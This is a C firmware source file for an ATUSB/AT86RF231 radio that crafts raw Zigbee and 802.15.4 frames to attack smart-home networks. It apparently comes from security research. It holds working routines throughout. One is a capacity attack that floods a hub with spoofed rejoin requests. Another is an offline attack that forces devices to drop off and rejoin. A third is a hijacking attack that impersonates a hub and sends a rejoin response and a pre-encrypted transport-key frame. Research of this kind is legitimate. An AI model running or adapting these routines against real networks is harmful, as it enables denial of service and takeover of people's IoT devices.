/*
 * fw/attacks/attack_12.c
 *
 * Written 2021 by Jincheng
 * Copyright 2021 Jincheng Wang
 *
 */
#include "attack.h"

extern uint8_t rejoin_full_flag;
extern uint8_t beacon_request_flag;
extern uint8_t tc_rejoin_request_flag;
extern uint8_t data_request_flag;

uint8_t count = 0;
unsigned char length = 0;
uint16_t FCF = 0;
unsigned char seqno = 0;
unsigned char cmd = 0;
/********  Transciver Library ********/

/**
 * @brief  set_rx_aack: Set the required registers used for RX_AACK mode, then transfer the state to RX_AACK
 * @note   
 * @param  aack_config: Config used to set RX_AACK
 * @retval None
 */
void set_rx_aack(rx_aack_config* aack_config)
{
	// This function is mostly called when there is packets being sent. So first make sure that current packet has been sent out.
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_BUSY_TX_ARET);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_TX_ARET_ON);
	// In order to reply an ACK automaticlly, we need to first transit to PLL_ON, then transit into RX_AACK state
	change_state(TRX_CMD_FORCE_PLL_ON);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON);
	// Here we need to configure address for AACK, then transist into AACK mode
	reg_write(REG_SHORT_ADDR_0, aack_config->target_short_addr.addr_bytes[0]);
	reg_write(REG_SHORT_ADDR_1, aack_config->target_short_addr.addr_bytes[1]);
	reg_write(REG_PAN_ID_0, aack_config->target_pan_id.addr_bytes[0]);
	reg_write(REG_PAN_ID_1, aack_config->target_pan_id.addr_bytes[1]);

	// Set registers used by RX_AACK. Please refer to Page 55 in AT86RF231 spec.
	reg_write(0x0c, 0x00);
	reg_write(0x17, 0x02); // AACK_ACK_TIME: Send ACK quickly. Default value for 0x17: 0x00
	reg_write(0x2c, 0x38);
	if(!aack_config->dis_ack) {
		reg_write(0x2e, 0xc2);
	}
	else {
		reg_write(0x2e, 0xc2 | AACK_DIS_ACK);
	}
	if(aack_config->pending) {
		reg_write(0x2e, reg_read(0x2e) | AACK_SET_PD);
	}

	// Transist to RX_AACK_ON mode
	change_state(TRX_CMD_RX_AACK_ON);
	uint8_t reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;

	// Finally, make sure the state transition is right
	while(reg_status != TRX_CMD_RX_AACK_ON && reg_status != TRX_STATUS_BUSY_RX_AACK)
	{
		reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
	}
}

/**
 * @brief  send_zbee_cmd: This is the framework for ATUSB to send packets
 * @note   
 * @param  layer:    	 Input: 1: MAC-Layer Command 2: NWK-Layer Command 3: APS-Layer Command
 * @param  command:  	 Input: The command ID which we want to send
 * @param  security: 	 Input: Security enable flags used in the frame
 * @param  dst_addr: 	 Input: dest addr information
 * @param  src_addr: 	 Input: src  addr information
 * @param  aack_config:  Input: user-defined aack_config
 * @retval None
 */
 
void send_zbee_cmd(uint8_t command, uint8_t security,
				   ieee802154_addr* dst_addr, ieee802154_addr* src_addr,
				   rx_aack_config* aack_config)
{
	// 1: Change Transciver state to TRX_CMD_FORCE_PLL_ON
	change_state(TRX_CMD_FORCE_PLL_ON);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON)
	{
		_delay_us(10);
	}
	
	// 2: Send Packets
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);

	// Finally we applied hard-coded methods.
	switch (command) {
		case ZBEE_MAC_CMD_DATA_RQ :
			send_data_request(security, dst_addr, src_addr);
			break;
		case ZBEE_MAC_CMD_BEACON_RQ :
			send_beacon_request(security, dst_addr, src_addr);
			break;
		case ZBEE_MAC_CMD_BEACON_RP :
			send_beacon_response(security, dst_addr, src_addr);
			break;
		case ZBEE_MAC_CMD_ORPHAN_NOTIF :
			send_orphan_notification(security, dst_addr, src_addr);
			break;
		case ZBEE_NWK_CMD_REJOIN_RQ :
			send_rejoin_request(security, dst_addr, src_addr);
			break;
		case ZBEE_NWK_CMD_REJOIN_RP :
			send_rejoin_response(security, dst_addr, src_addr);
			break;
		case ZBEE_APS_CMD_KEY_TRANSPORT :
			send_transport_key(security, dst_addr, src_addr);
			break;
		default :
			break;
	}

	spi_end();
	// 3: Send the packet
	change_state(TRX_STATUS_TX_ARET_ON);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_TX_ARET_ON)
	{
		_delay_us(10);
	}
	slp_tr();
	
	// 4: Determine and configure the afterwards transciver mode
	if (aack_config->aack_flag)
	{
		set_rx_aack(aack_config);
	}
	else
	{
		// If RX_AACK is not needed, here we simply transform the state to RX_ON
		change_state(TRX_CMD_RX_ON);
		// change_state(TRX_CMD_PLL_ON);
	}
}

static uint8_t spi_send_blocks(void *data, uint8_t size)
{
	uint8_t byte_count = 0 ;
	char* pdata = (char*)data;
	for(; byte_count < size; byte_count ++) {
		spi_send(*(pdata+byte_count));
	}

	assert(byte_count == size);
	return byte_count;
}

/********  END of Transciver Library *******/

/********  Command Library *******/

// MAC Layer Command
void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 10 + 2;
	FCF = 0x8863;
	seqno = 0xff;
	cmd = 0x04;

	count += spi_send_blocks(&length, sizeof(length));
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&cmd, sizeof(cmd));

	assert(count == length - 1);
}

void send_beacon_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 8 + 2;
	FCF = 0x0803;		
	seqno = 0xff;
	// For beacon request, the dst addr and dst pan id is 0xffff
	uint16_t const_dst_addr = 0xffff;
	cmd = 0x07;

	count += spi_send_blocks(&length, sizeof(length));
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&const_dst_addr, sizeof(const_dst_addr));
	count += spi_send_blocks(&const_dst_addr, sizeof(const_dst_addr));
	count += spi_send_blocks(&cmd, sizeof(cmd));

	assert(count == length - 1);
}

void send_beacon_response(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 26 + 2;
	FCF = 0x8000;		
	seqno = 0xff;
	uint16_t super_frame = 0x4fff;
	uint8_t GTS = 0x00;
	uint8_t pending = 0x00;
	uint8_t proto = 0x00;
	uint16_t beacon_field = 0x8422;
	unsigned char offset[] = {0xff, 0xff, 0xff};
	uint8_t update_id = 0x01;

	count += spi_send_blocks(&length, sizeof(length));
	
	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&src_addr->pan, sizeof(src_addr->pan));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&super_frame, sizeof(super_frame));

	// Beacon Payload
	count += spi_send_blocks(&GTS, sizeof(GTS));
	count += spi_send_blocks(&pending, sizeof(pending));
	count += spi_send_blocks(&proto, sizeof(proto));
	count += spi_send_blocks(&beacon_field, sizeof(beacon_field));
	count += spi_send_blocks(&src_addr->epan, sizeof(src_addr->epan));
	count += spi_send_blocks(offset, sizeof(offset));
	count += spi_send_blocks(&update_id, sizeof(update_id));

	assert(count == length - 1);
}

void send_orphan_notification(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 16 + 2;
	FCF = 0xc843;
	seqno = 0xff;
	cmd = 0x06;
	uint16_t broad_addr = 0xffff;

	count += spi_send_blocks(&length, sizeof(length));
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&broad_addr, sizeof(broad_addr));
	count += spi_send_blocks(&broad_addr, sizeof(broad_addr));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));
	count += spi_send_blocks(&cmd, sizeof(cmd));

	assert(count == length - 1);
}

// NWK Layer Command
void send_rejoin_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 27 + 2;
	FCF = 0x8861;		
	seqno = 0xff;

	uint16_t NWK_FCF = 0x1009;
	uint8_t radius = 0x01;
	uint8_t nwk_seq = 0xff;

	uint8_t capability_info = 0x80;
	if (src_addr->device_type < 2)
	{
		// Here we send rejoin request in represnetative as a Full-Function Device
		capability_info |= 0x02;
	}
	if (src_addr->rx_when_idle)
	{
		capability_info |= 0x08;
	}

	cmd = 0x06;

	count += spi_send_blocks(&length, sizeof(length));

	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));

	// NWK Payload
	count += spi_send_blocks(&cmd, sizeof(cmd));
	count += spi_send_blocks(&capability_info, sizeof(capability_info));

	assert(count == length - 1);

}

void send_rejoin_response(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 37 + 2;
	FCF = 0x8861;		
	seqno = 0xff;

	uint16_t NWK_FCF = 0x1809;
	uint8_t radius = 0x01;
	uint8_t nwk_seq = 0xff;
	uint8_t status = 0x00;

	cmd = 0x07;

	count += spi_send_blocks(&length, sizeof(length));

	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));
	count += spi_send_blocks(&dst_addr->long_addr, sizeof(dst_addr->long_addr));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));

	// NWK Payload
	count += spi_send_blocks(&cmd, sizeof(cmd));
	// TODO: Here we can replace the 16-bit address to assign a new address.
	// By default, we let assigned new address equal to ZED's previous addr
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&status, sizeof(status));

	assert(count == length - 1);

}

// APS Layer Command
void send_transport_key(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	assert(security == 1);
	count = 0;
	length = 71 + 2;
	FCF = 0x8861;		
	seqno = 0xff;

	uint16_t NWK_FCF = 0x0008;
	uint8_t radius = 0x1e;
	uint8_t nwk_seq = 0xff;

	uint8_t APS_FCF = 0x21;
	uint8_t counter = 0xff;

	uint8_t APS_SCF = 0x30;
	// TODO: Here we may need to replace the frame_counter
	uint32_t frame_counter = 0xaaaaaaaa;

	count += spi_send_blocks(&length, sizeof(length));
	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));

	// APS Layer
	count += spi_send_blocks(&APS_FCF, sizeof(APS_FCF));
	count += spi_send_blocks(&counter, sizeof(counter));

	// Aux Security Header
	count += spi_send_blocks(&APS_SCF, sizeof(APS_SCF));
	count += spi_send_blocks(&frame_counter, sizeof(frame_counter));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));
	
	// TODO: Here we need to use encryption function in zigbee_crypt.c
	unsigned char encrypted_payload[] = {
		0x1f, 0xd0, 0x09, 0x1b, 0xb8, \
		0x1f, 0x19, 0x7d, 0x4e, 0x50, \
		0x1c, 0xea, 0x75, 0xc9, 0xe0, \
		0xd1, 0x88, 0x39, 0xc1, 0x3e, \
		0xda, 0x8f, 0x53, 0x6f, 0x14, \
		0x70, 0x60, 0x5a, 0xb1, 0xca, \
		0x0f, 0xda, 0x22, 0xd3, 0x0e \
	};
	unsigned char MIC[4] = {0xc6, 0xcd, 0xa7, 0xf6};

	count += spi_send_blocks(encrypted_payload, sizeof(encrypted_payload));
	count += spi_send_blocks(MIC, sizeof(MIC));
	assert(count == length - 1);
}

/********  END of Command Library *******/

/********  END of Detect-Specific Library *******/

/********  Attack-Specific Functions *******/


void reconnaissance_attack(void)
{
 // TODO: Implement the attack
}

/**
 * @brief  Implement the first attack: Capacity Attack
 * @note   
 * @param  dst_addr:  The target hub's information.
 * @param  random_addr
 * @param  type: type = 2; ZED;	type = 1: ZR; type = 0: ZC
 * @retval 1 if succeed; 0 if the number of sent TC rejoin request exceeds the bound.
 */
uint8_t capacity_attack(ieee802154_addr* dst_addr, uint64_t random_addr, uint8_t type)
{
	uint32_t trial_count = 0;
	ieee802154_addr ghost_addr = *dst_addr;
	ghost_addr.short_addr  = 0x1234;
	ghost_addr.long_addr = random_addr;
	ghost_addr.device_type = type;
	ghost_addr.rx_when_idle = 1;
	rx_aack_config aack_config = {};
	aack_config.aack_flag = 1;
	aack_config.dis_ack = 0;
	aack_config.pending = 0;
	aack_config.target_short_addr.addr = ghost_addr.short_addr;
	aack_config.target_pan_id.addr = ghost_addr.pan;

	// The rejoin_full_flag is modified in processing_incoming_packets()
	while(!rejoin_full_flag)
	{
		send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, dst_addr, &ghost_addr, &aack_config);
		// Delay for a preiod
		_delay_ms(REJOIN_REQUEST_INTERVAL);
		trial_count += 1;
		// Update the MAC address by adding 1.
		ghost_addr.long_addr += 1;
		// If too many trials have been done, then stop the capacility attack.
		if (trial_count >= MAX_REJOIN_REQUEST_NUM) {
			return 0;
		}
	}
	return 1;
}

uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
{
	/** 1. Trigger ZED to leave and rejoin. **/
	rx_aack_config aack_config = {};
	aack_config.aack_flag = 0;
	aack_config.dis_ack = 0;
	aack_config.pending = 0;
	aack_config.target_short_addr.addr = victim_addr->short_addr;
	aack_config.target_pan_id.addr = victim_addr->pan;

	if (victim_addr->device_type == 1)
	{
		// TODO: Implement the Offline Attack logic for ZR
		send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
	}
	else if (victim_addr->device_type == 2)
	{
		if (victim_addr->polling_type == 2)
		{
			//TODO: For high polling-rate ZED, implement the logic shown in slides
			send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
		}
		else if (victim_addr->polling_type == 1)
		{
			// TODO: How do we deal with ZED with low polling rate, e.g., Dimmer Switch?
		}
	}
	/** 2. Launch capacity attack again **/
	// Here we need to delay 1 second to wait for multiple Rejoin response finished.
	_delay_ms(1000);
	rejoin_full_flag = 0;
	capacity_attack(hub_addr, random_addr + 0x10000000, victim_addr->device_type);
	return 1;
}

uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
{
	// 1. Wait for beacon request
	beacon_request_flag = 0;
	// 2. Send Beacon Response.
	// Also, here we pretend to be a fake hub with our PAN ID.
	ieee802154_addr fake_hub_addr = *hub_addr;
	fake_hub_addr.pan = 0x5678;
	rx_aack_config aack_config = {};
	aack_config.aack_flag = 0;
	aack_config.dis_ack = 0;
	aack_config.pending = 0;
	aack_config.target_short_addr.addr = fake_hub_addr.short_addr;
	aack_config.target_pan_id.addr = fake_hub_addr.pan;
	// 3. Detect TC rejoin request and Data Request, and turn on AACK
	while(!tc_rejoin_request_flag)
	{
		beacon_request_flag = 0;
		while(!beacon_request_flag)
		{
			_delay_us(300);
		}
		send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0,victim_addr, &fake_hub_addr, &aack_config);
		// Wait for TC Rejoin Request
		_delay_us(50);
	}
	aack_config.aack_flag = 1;
	// 4. Detect Data Request and Send Rejoin Response Command.
	data_request_flag = 0;
	while(!data_request_flag)
	{
		_delay_us(50);
	}
	send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, victim_addr, &fake_hub_addr, &aack_config);
	// 5. Detect Data Request and Send Transport Key Command.
	data_request_flag = 0;
	while(!data_request_flag)
	{
		_delay_us(50);
	}
	send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, victim_addr, &fake_hub_addr, &aack_config);
	return 1;
}

/********  END of Attack-Specific Library *******/